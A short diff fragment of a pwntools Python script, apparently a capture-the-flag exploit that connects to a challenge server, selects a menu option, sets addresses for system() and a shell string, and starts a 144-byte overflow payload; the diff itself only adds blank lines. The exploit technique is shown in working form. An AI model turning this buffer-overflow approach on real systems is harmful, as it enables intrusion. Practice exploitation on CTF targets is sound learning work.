@@ -154,10 +154,13 @@ from pwn import *
 p = remote('ctf.j0n9hyun.xyz', 3010)
 
 p.recv(1024)
+
 p.sendline('5')
+
 p.recvuntil("[Attack] > ")
 
 system_addr = p32(0x080485b0)
+
 bin_addr = p32(0x8048eb1)
 
 payload = "A"*144
